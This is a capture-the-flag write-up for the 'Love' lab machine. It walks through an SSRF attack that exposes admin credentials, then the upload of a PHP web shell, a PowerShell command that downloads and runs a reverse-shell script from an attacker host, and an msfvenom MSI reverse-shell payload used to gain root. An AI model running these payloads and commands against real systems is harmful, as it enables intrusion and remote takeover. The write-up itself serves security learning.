# Love Writeup
### Keywords: PHP reverse shell, Server-side request forgery (SSRF)

#### Reconnaissance:

Let us start with our nmap scan and we get many open ports there. As it is a windows machine, we find bunch of ports to look for:

- HTTP/HTTPS on 80, 443, and 5000.
- SMB/RPC on 135/139/445.
- MySQL on 3306.
- WinRM is available if I find creds.
- Unknown services on 5040 and 7680.

After examining the TLS certificate we see that there are two domain present here, `love.htb` and `staging.love.htb` 

l**ove.htb** returns the same result i.e. a voting login page which is using php.

Try to bruteforce the login page with the help of sqlmap but noting happened.

When we go to **staging.love.htb** there we find a ‘FreeFileScanner’, it is a file scanning application.

#### Gain Access:

After moving here and there inside the application we go to `/beta.php`, where there’s a form that takes a url.

When I saw this application is scanning url so there is a possibility of SSRF(Server side request forgery).

<aside>
💡 Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.
In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.

</aside>

we tried entering `https://127.0.0.1`, but nothing returned. However, when we checked the service on 5000 by entering `http://127.0.0.1:5000`

And boom!! we get the admin credentials.

```
Vote Admin Creds admin:@LovelsInTheAir!!!!
```

#### User.txt:

Now we logged in as an admin inside the application, after exploring the application, we tried to add a voter in the database, and intercept this request in the BurpSuite.
We edit the data and put our php script there:

```php
<?php
system($_REQUEST[’cmd’]);
?>
```

Now change the file name .jpeg to .XYZ.php, let us check our payload shall we.

We go to `/images/xyz.php?cmd=dir` and we have **command Injection.**

<aside>
💡 If the user data is not strictly validated, an attacker can use crafted input to modify the code to be executed, and inject arbitrary code that will be executed by the server.

</aside>

Now let us try to grab a reverse shell on the machine:

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS:PORT_NO/revshell.ps1')"
```

and we get a shell after opening the user directory we get our user.txt flag.

#### Root.txt:

Now it is very simple from here, we already know that this is a windows machine so let try to reverse shell payload here for root directory.
##### Paylaod:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f msi > payload.msi
```

Upload this payload on the machine, and listen the connection on your LPORT and after run the payload.msi file, we have a reverse shell on root server.

Go to root directory, and we get our root.txt flag. 

Hope you like this writeup, if you like it please show some love by follow me on:

GitHub: [https://github.com/mvaibhavm09](https://github.com/mvaibhavm09)

LinkedIn: [https://linkedin.com/in/mvaibhavm09](https://linkedin.com/in/mvaibhavm09)

Twitter:  [https://twitter.com/mvaibhavm09](https://twitter.com/mvaibhavm09) 

Happy Hacking :)
